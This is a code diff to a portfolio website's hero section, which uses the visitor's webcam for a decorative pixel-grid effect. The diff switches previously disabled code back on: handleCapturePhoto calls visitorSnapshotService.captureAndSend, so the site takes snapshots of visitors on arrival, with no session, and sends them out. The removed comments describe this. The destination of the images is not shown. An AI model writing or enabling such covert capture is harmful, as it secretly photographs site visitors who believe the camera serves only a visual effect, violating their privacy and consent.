@@ -19,7 +19,7 @@ import { Link } from "@/i18n/routing";
 import { WebcamPixelGrid } from "@/shared/components/aceternity/webcam-pixel-grid";
 import { useCamera } from "@/shared/context/CameraContext";
 
-// import { visitorSnapshotService } from "@/shared/services/visitor-snapshot.service"; // TODO: vaqtincha o'chirilgan
+import { visitorSnapshotService } from "@/shared/services/visitor-snapshot.service";
 
 const CODE_SNIPPETS = [
   { code: "const dev = 'Matkarim';", x: "10%", y: "15%", delay: 0 },
@@ -146,14 +146,12 @@ export function HeroSection() {
     [],
   );
 
-  // TODO: Rasmga olish funksiyasi vaqtincha o'chirilgan
-  // const handleCapturePhoto = useCallback(
-  //   async (videoElement: HTMLVideoElement) => {
-  //     // Saytga kirganda rasm olish (session yo'q)
-  //     await visitorSnapshotService.captureAndSend(videoElement, null);
-  //   },
-  //   [],
-  // );
+  const handleCapturePhoto = useCallback(
+    async (videoElement: HTMLVideoElement) => {
+      await visitorSnapshotService.captureAndSend(videoElement, null);
+    },
+    [],
+  );
 
   const handleVideoReady = useCallback(
     (videoElement: HTMLVideoElement) => {
@@ -175,7 +173,7 @@ export function HeroSection() {
           maxElevation={35}
           darken={0.4}
           className="h-full w-full"
-          // onCapturePhoto={handleCapturePhoto} // TODO: vaqtincha o'chirilgan
+          onCapturePhoto={handleCapturePhoto}
           onVideoReady={handleVideoReady}
           showErrorUI={false}
           onErrorStateChange={handleCameraErrorChange}
